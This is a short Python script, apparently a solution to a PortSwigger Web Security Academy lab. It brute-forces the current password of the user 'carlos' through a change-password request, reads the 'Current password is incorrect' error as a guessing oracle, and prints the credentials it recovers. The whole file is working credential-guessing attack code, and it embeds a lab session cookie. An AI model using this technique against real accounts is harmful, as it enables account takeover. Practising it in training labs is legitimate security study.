from fartlib import *

req = FartRequest("""
POST /my-account/change-password HTTP/1.1
Host: 0ae8008203788a7ec0d3e046003c0077.web-security-academy.net
Cookie: session=QtarkLQIFQGtYIDouW8db18YQPUTRJsy
Content-Length: 80
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0ae8008203788a7ec0d3e046003c0077.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae8008203788a7ec0d3e046003c0077.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

username=carlos&current-password=pwd&new-password-1=password1&new-password-2=password2
""")

response = HttpWorker(req.substitute(pwd=passwords)).get_first(lambda x: "Current password is incorrect" not in x.raw_response.text)

password = passwords[response.index]
print("found creds:", "carlos", password)
